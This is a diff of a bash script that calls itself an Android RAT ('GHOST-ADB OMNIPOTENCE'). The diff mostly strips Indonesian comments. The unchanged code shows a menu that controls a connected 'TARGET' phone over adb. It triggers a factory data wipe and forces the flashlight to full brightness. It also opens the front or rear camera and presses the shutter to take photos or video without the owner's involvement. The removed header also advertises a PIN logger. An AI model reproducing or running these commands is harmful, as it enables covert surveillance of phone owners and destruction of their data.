@@ -1,10 +1,5 @@
 #!/bin/bash
 
-# =================================================================
-# GHOST-ADB OMNIPOTENCE v44.5 (TOTAL FINAL EDITION)
-# PONDASI: v42.1 (HUNTING EDITION) - TIDAK ADA FITUR DIHAPUS
-# TAMBAHAN: Full Camera (Front/Back), Video, PIN Logger, Sound Prank
-# =================================================================
 
 RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
 BLUE="\e[1;34m"; MAGENTA="\e[1;35m"; CYAN="\e[1;36m"
@@ -44,21 +39,21 @@ recon_target() {
 
 header() {
     tput reset
-    recon_target # Update info perangkat
+    recon_target
     
     echo -e "${RED}${BOLD}"
-    # Baris 1-3: Kosongkan sampingnya agar teks tidak terlalu ke atas
+
     echo -e "           uuuuuuu             "
     echo -e "       uu\$\$\$\$\$\$\$\$\$\$\$uu         "
     echo -e "    uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$uu      "
     
-    # Baris 4-7: Mulai isi teks di samping (Sejajar Tengah)
+
     echo -e "   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u      ${BLUE}[GHOST-ADB]${RED}"
     echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${RED}[Android RAT]${RED}"
     echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${YELLOW}[Tools BY:Sneijderlino]${RED}"
     echo -e "  u\$\$\$\$\$\$\"   \"\$\$\$\"   \"\$\$\$\$u     ${GREEN}──────────────────────${RED}"
     
-    # Baris 8 ke bawah: Sisa gambar tengkorak
+
     echo -e "  \"\$\$\$\$\"      u\$u       \"\$\$\$\"   "   
 
     echo -e "   \$\$\$u       u\$u       u\$\$\$    "                                                  
@@ -71,7 +66,7 @@ header() {
     echo -e "          \$\$\$\$\$\$\$\$\$\$\$          "
     echo -e "           \"\$\$\$\$\$\$\$\"           "
     
-    # Bagian Status Perangkat (Garis Bawah)
+
     echo -e "${GREEN}  ════════════════════════════════════════════════════════${RESET}"
     if [ "$CONNECTED" = true ]; then
         echo -e "   TARGET : ${CYAN}$MODEL (A$ANDROID_VER)${RESET} | $ROOT_S"
@@ -180,7 +175,7 @@ menu_otomatis() {
             53) adb shell "su -c 'echo 255 > /sys/class/leds/flashlight/brightness'" ;;
             54) echo -e "${RED}WIPE DATA? (y/n)${RESET}"; read -p "> " Y; [ "$Y" == "y" ] && adb shell am broadcast -a android.intent.action.MASTER_CLEAR ;;
             
-            # --- TAMBAHAN COMMAND BARU ---
+
             c1) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
             c2) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false; sleep 2; adb shell input keyevent 27 ;;
             c3) adb shell am start -a android.media.action.VIDEO_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
